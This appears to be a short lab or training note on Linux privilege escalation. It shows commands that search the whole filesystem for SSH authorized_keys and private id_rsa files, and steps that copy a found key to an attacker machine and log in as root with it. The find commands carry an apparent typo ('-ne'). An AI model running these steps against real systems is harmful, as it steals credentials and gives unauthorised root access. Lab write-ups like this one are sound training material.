## Detection

**Linux VM**

1. Find authorized keys:
   ```bash
   find / -ne authorized_keys 2> /dev/null
   ```
2. Find private SSH keys:
   ```bash
   find / -ne id_rsa 2> /dev/null
   ```
3. Note the results.
![[Pasted image 20240905213345.png]]


![[Pasted image 20240905213819.png]]
## Exploitation

**Linux VM**

1. Copy the contents of the discovered `id_rsa` file to your attacker VM.

**Attacker VM**

1. Set the correct permissions on the private key:
   ```bash
   chmod 400 id_rsa
   ```

![[Pasted image 20240905213902.png]]
2. Connect to the target machine:
   ```bash
   ssh -i id_rsa root@<ip>
   ```
